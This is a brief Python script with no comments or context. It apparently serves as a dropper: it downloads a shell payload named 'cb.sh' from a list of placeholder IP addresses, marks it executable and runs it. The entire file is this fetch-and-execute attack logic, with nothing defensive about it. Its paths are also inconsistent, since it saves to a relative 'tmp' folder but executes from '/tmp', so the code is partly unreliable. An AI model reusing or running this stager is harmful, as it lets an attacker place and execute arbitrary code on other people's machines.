import urllib.request as request
import os

urls = ["1.1.1.1", "2.2.2.2"] #changeme
port = "80"
payload = "cb.sh"

for url in urls:
	u = "http://{}:{}/{}".format(url, port, payload)
	try:
		r = request.urlopen(u)
		wfile = open("tmp/cb.sh", "wb")
		wfile.write(r.read())
		wfile.close()
		break
	except:
		print('aa')
		continue

if os.path.exists("tmp/cb.sh"):
	os.system("chmod 700 /tmp/cb.sh")
	os.system("/tmp/cb.sh")
else:
	print('not successful')